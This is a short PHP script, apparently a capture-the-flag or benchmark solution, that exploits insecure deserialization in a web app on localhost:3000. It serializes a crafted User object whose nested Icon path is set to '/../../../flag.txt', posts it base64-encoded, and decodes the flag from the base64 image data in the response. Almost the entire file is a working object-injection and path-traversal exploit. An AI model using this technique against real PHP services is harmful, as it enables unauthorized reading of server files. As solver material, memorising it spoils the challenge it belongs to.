<?php

class User {
    public $name;
    public $title;
    public $summary;
    public $skills;
    public $iconType;

    public function __construct()
    {
        $this->name = new Icon();
        $this->title = 'test';
        $this->summary = 'test';
        $this->skills = 'test';
        $this->iconType = 'A';
    }
}

class Icon {
    public $path;

    public function __construct()
    {
        $this->path = "/../../../flag.txt";
    }

}

$host = getenv('HOST') ?: 'localhost';
$port = getenv('PORT') ?: '3000';
$url = 'http://' . $host . ':' . $port;

$serialized = serialize(new User());

$payloadB64 = base64_encode($serialized);
$postFields = http_build_query(['serialized' => $payloadB64], '', '&');

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => $postFields,
    CURLOPT_HTTPHEADER     => ['Content-Type: application/x-www-form-urlencoded'],
]);

$res = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

preg_match('~<h1>data:image/png;base64,([A-Za-z0-9+/=]+)</h1>~', $res, $m);
$b64 = $m[1];
$flag = base64_decode($b64, true);
echo $flag . "\n";